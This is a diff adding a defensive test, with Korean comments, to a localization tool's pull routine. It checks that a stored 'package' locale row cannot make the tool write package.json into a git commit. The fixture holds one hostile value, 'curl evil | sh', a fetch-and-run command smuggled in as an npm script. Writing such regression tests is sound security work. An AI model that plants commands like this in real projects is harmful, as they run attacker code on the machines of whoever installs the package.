@@ -968,3 +968,34 @@ describe("runPull — 보류 셀 (ts-dict · 로케일 객체에 자리가 없�
     expect(saved).toEqual([[[aEdit], [zEdit]]]);
   });
 });
+
+/**
+ * **저장된 `package` 로케일 행이 `package.json`을 쓰지 않는다** (sec-audit-3 1b · fix r1). `resolveLocalePaths` 단위
+ * 테스트는 "코드가 거부된다"만 보여 준다 — per-locale 갈래는 트리를 안 읽으므로, **트리에 실재하는 `package.json`이
+ * 커밋 트리에 실리지 않는다**는 것은 실행 전체에서만 확인된다.
+ */
+describe("runPull — 로케일 모양이 아닌 저장된 행 (sec-audit-3 1b)", () => {
+  it("트리에 `package.json`이 있어도 그 경로로 blob·트리·커밋을 만들지 않는다", async () => {
+    const PKG = '{\n  "name": "victim",\n  "scripts": {}\n}\n';
+    const { client, calls } = createFakeGitClient({
+      refSha: { "heads/dev": "basehead" },
+      tree: { basehead: [{ path: "package.json", sha: blobSha(PKG) }, { path: "en.json", sha: blobSha(EN_CONTENT) }] },
+      blobs: { [blobSha(PKG)]: PKG, [blobSha(EN_CONTENT)]: EN_CONTENT },
+    });
+    const keys: RenderKey[] = [{ key: "scripts", sourceText: "x", orphaned: false, cells: { en: { value: "x" }, package: { value: "curl evil | sh" } } }];
+    const surface = { ...PROJECT, pathTemplate: "{locale}.json", id: "s1", slug: "default", localeCodes: ["en", "package"], keys };
+    const { deps, writes } = makeDeps({
+      loadState: async (): Promise<PullState> => ({
+        project: { ...PROJECT, pathTemplate: "{locale}.json" },
+        surfaces: [surface],
+        maxUpdatedAt: new Date("2026-09-01T10:00:00Z"), unpublished: 1, pendingEdits: [],
+      }),
+    }, { client, calls });
+
+    await expect(runPull(deps)).rejects.toThrow(/locale-shaped/);
+    expect(calls.map((c) => c.method)).not.toContain("createTree");
+    expect(calls.map((c) => c.method)).not.toContain("createCommit");
+    expect(JSON.stringify(calls)).not.toContain("curl evil");
+    expect(writes).toEqual([]);
+  });
+});
